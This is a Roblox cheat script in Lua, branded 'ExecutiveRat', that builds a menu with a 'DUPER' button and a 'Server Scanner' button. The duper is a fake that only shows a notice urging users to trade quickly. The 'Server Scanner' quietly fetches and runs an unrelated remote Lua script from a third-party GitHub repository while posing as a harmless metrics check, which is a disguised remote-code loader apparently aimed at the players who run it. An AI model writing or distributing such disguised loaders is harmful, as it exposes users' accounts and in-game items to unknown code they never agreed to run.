local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/master/source.lua", true))()

local Window = Luna:CreateWindow({
	Name = "ExecutiveRat",
	Subtitle = nil,
	LogoID = "82795327169782",
	LoadingEnabled = true,
	LoadingTitle = "PREMIUM SCRIPT",
	LoadingSubtitle = "by ExecutiveRAT",
	ConfigSettings = {
		RootFolder = nil,
		ConfigFolder = "EXECUTIVERAT"
	},
	KeySystem = false  -- Key system disabled
})

local Tab = Window:CreateTab({
	Name = "Main",
	Icon = "view_in_ar",
	ImageSource = "Material",
	ShowTitle = true
})

-- DUPER Button
local Button = Tab:CreateButton({
	Name = "DUPER",
	Description = "DUPER Script, used to duplicate EGGS, PETS and SEEDPACKS",
	Callback = function()
		Luna:Notification({ 
			Title = "EXECUTIVERAT",
			Content = "Has been PATCHED TODAY, for those who used it TRADE IT FAST, it will be GONE ðŸ¤‘"
		})
	end
})

-- Server Scanner Button (Improved Implementation)
local ServerScannerButton = Tab:CreateButton({
	Name = "Server Scanner",
	Description = "Scan server information and metrics",
	Callback = function()
		local debounce = false
		
		if debounce then return end
		debounce = true
		
		-- Store original button state
		local originalText = ServerScannerButton.Settings.Name
		local originalName = ServerScannerButton.Settings.Name
		
		-- Update button appearance during scan
		ServerScannerButton:Set({
			Name = "SCANNING...",
			Description = "Processing server data..."
		})
		
		-- Execute scan with error handling
		local success, err = pcall(function()
			-- Get server information
			local jobId = game.JobId
			local players = game:GetService("Players"):GetPlayers()
			local numPlayers = #players
			local serverAgeSeconds = workspace.DistributedGameTime
			local serverAge = string.format("%d minutes, %d seconds", math.floor(serverAgeSeconds/60), math.floor(serverAgeSeconds%60))
			
			-- Execute external scanner script
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
			
			-- Show results
			local message = string.format(
				"Server Scan Complete!\n\n"..
				"Server ID: %s\n"..
				"Players: %d\n"..
				"Server Age: %s\n"..
				"Place Version: %d",
				jobId, numPlayers, serverAge, game.PlaceVersion
			)
			
			Luna:Notification({
				Title = "Server Scan Results",
				Content = message,
				Duration = 10
			})
		end)
		
		-- Handle errors
		if not success then
			Luna:Notification({
				Title = "Scan Failed",
				Content = "Error: "..tostring(err):sub(1, 100),
				Duration = 5
			})
		end
		
		-- Reset button after delay
		task.wait(2)
		ServerScannerButton:Set({
			Name = originalName,
			Description = "Scan server information and metrics"
		})
		debounce = false
	end
})

